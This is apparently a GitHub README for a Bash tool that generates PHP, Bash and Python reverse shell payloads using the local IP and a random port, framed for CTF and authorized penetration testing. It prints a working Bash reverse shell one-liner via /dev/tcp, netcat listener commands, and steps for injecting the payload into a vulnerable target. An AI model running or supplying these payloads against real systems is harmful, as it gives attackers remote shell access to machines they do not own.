# Reverse-Shell-Creator
🔁 Reverse Shell Generator

A simple Bash-based tool that automates the creation of reverse shell payloads using your local system IP and a randomly generated port. This script is designed for CTF practice, lab environments, and authorized penetration testing only.

📌 Features

Automatically detects local IPv4 address

Generates random listening ports

Supports multiple reverse shell payloads:

PHP One-liner

Bash Reverse Shell

Python Reverse Shell

URL encoding support (Burp-friendly)

Interactive shell selection menu

Lightweight and fast

⚠️ Disclaimer

This tool is intended for educational purposes, CTF challenges, and authorized security testing only.
Do NOT use this tool against systems you do not own or have permission to test.

🛠 Requirements

Ensure the following tools are installed:

Bash

ip command (iproute2)

Burp encoding helper function (burp_urlencode)

Linux environment

📂 Installation

Clone the repository:

git clone https://github.com/YOUR_USERNAME/reverse-shell-generator.git
cd reverse-shell-generator


Make the script executable:

chmod +x reverse_shell.sh

⚙️ Setup

This script depends on:

~/.bash_functions


Ensure that your .bash_functions file contains:

burp_urlencode()


Example implementation:

burp_urlencode() {
    python3 -c "import urllib.parse, sys; print(urllib.parse.quote(sys.argv[1]))" "$1"
}

🚀 Usage

Run the script:

./reverse_shell.sh

🖥 Workflow
Step 1 – Run Script Locally

The script will:

✔ Detect your local IP address
✔ Generate a random port
✔ Present available reverse shell payload options

Example:

Your IP Address: 192.168.1.5
Your IP Port: 4321

Step 2 – Choose Payload Type

Select from the interactive menu:

1) PHP_One_Liner
2) PHP_Classic
3) Bash
4) Python

Step 3 – Copy Generated Payload

The script outputs:

Raw reverse shell command

URL encoded version (useful for web exploitation)

Example:

Bash_Reverse_Shell: bash -i >& /dev/tcp/192.168.1.5/4321 0>&1

Step 4 – Start Listener

Before executing payload on target system, start a listener locally:

nc -lvnp <PORT>


Example:

nc -lvnp 4321

Step 5 – Execute Payload on Target

Run or inject the payload into the vulnerable system.

Once executed, you should receive a reverse shell connection.

🧠 Supported Reverse Shells
PHP One-Liner

Good for web-based RCE vulnerabilities.

Bash Reverse Shell

Works well when Bash is available on target.

Python Reverse Shell

Useful when Python is installed on target system.

🔄 Port Generation Logic

Ports are randomly generated between:

3000 – 6000


This reduces port reuse and detection likelihood.

📜 Script Overview
IP Address Detection
ip -4 addr show eth0

Random Port Generator

Uses Bash $RANDOM to select port range.

Shell Selection

Interactive select menu for usability.

📈 Future Improvements

Add Netcat reverse shell generation

Add Windows PowerShell payloads

Custom IP/Port input option

Multiple interface support

Listener auto-launch feature

Payload file export option

🤝 Contribution

Pull requests are welcome.
If you have payload improvements or new shell types, feel free to contribute.

🧑‍💻 Author

Madaki Meshach

⭐ Support

If you find this tool useful, consider starring the repository.

📊 Suggested GitHub Repo Structure
reverse-shell-generator/
│
├── reverse_shell.sh
├── README.md
└── LICENSE

🏆 Optional Nice Additions (Highly Recommended)
Add MIT License

Create:

LICENSE
